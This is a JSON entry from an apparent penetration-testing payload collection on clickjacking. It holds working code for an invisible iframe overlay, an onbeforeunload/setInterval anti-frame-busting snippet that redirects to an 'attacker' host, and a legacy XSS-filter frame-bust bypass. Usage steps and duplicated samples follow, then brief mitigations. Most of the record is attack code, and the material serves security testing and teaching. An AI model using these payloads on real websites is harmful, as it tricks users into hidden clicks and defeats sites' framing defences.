{"id": "payload_000015", "important": {"title": "Clickjacking - Invisible iframe & Anti-bust", "category": "UI Manipulation", "sub_category": "Invisible Iframe - Anti-bust", "tags": ["clickjacking", "iframe", "onbeforeunload", "framebust", "xss-filter"], "targets": {"os": ["Any"], "system": ["Browser", "Web App", "Admin Panels"]}, "risk": "high"}, "variants": [{"match": {"os": ["Any"], "system": ["Invisible iframe"]}, "payload": {"explanation": "Embed the target site in an invisible iframe and overlay bait; clicks affect the framed site.", "code": "<iframe src=\"https://legitimate-site.com/login\" style=\"opacity:0; height:0; width:0; border:none;\"></iframe>", "run_context": "Attacker page embedding target in iframe; overlay clickable elements aligned to iframe controls.", "placeholders": {"TARGET_LOGIN": "https://legitimate-site.com/login"}, "notes": "Cookie scoping and SameSite flags affect feasibility."}}, {"match": {"os": ["Any"], "system": ["OnBeforeUnload anti-bust"]}, "payload": {"explanation": "Use onbeforeunload and periodic navigation to prevent frame-busting code from escaping the iframe.", "code": "window.onbeforeunload = function(){ return 'Do you want to leave?'; }; setInterval(function(){ if(window.onbeforeunload) window.top.location='http://attacker/204.php'; }, 1);", "run_context": "Top-level attacker page that contains framed target.", "placeholders": {"ATTACKER_204": "http://attacker/204.php"}, "notes": "Browser behavior varies; may require timing and user interaction."}}, {"match": {"os": ["Any"], "system": ["XSS Filter / Frame-bust bypass"]}, "payload": {"explanation": "Leverage historical browser XSS filter quirks to neutralize frame-busting scripts by injecting fragments.", "code": "<iframe src=\"http://target/?param=<script>if\" style=\"opacity:0\"></iframe>", "run_context": "Browser â€” depends on legacy filter behavior (IE8, old Chrome).", "placeholders": {"TARGET_INJECTION": "http://target/?param=<injection_fragment>"}, "notes": "Modern browsers have mostly fixed these behaviors; use only for historical/contextual tests."}}], "usage": {"steps": ["Test framing capability and cookie scope.", "Decide whether overlay, iframe or anti-bust flow is needed.", "Craft attacker page with required anti-bust or iframe alignment.", "Verify via controlled accounts and document PoC."], "tools": ["Browser devtools", "Burp Suite"], "required_params": {"target_url": {"required": true, "example": "https://legitimate-site.com/login"}}, "code_samples": [{"title": "Invisible iframe PoC", "description": "Load target in invisible iframe.", "code": "<iframe src=\"https://legit/login\" style=\"opacity:0; height:0; width:0; border:none\"></iframe>", "placeholders": {"TARGET": "https://legit/login"}, "run_context": "browser"}, {"title": "OnBeforeUnload anti-bust snippet", "description": "Prevent frame-bust by prompting navigation repeatedly.", "code": "window.onbeforeunload = function(){ return 'Do you want to leave?'; }; setInterval(function(){ window.top.location = 'http://attacker/204.php'; }, 1);", "run_context": "attacker page"}], "mitigations": ["Use X-Frame-Options / CSP frame-ancestors.", "Avoid client-only frame-busting; rely on server headers.", "Use SameSite cookie flags and HttpOnly to reduce impact."], "references": ["PortSwigger - Clickjacking", "OWASP Clickjacking"]}, "system": {"version": "2.0.0", "source": "PayloadsAllTheThings"}}
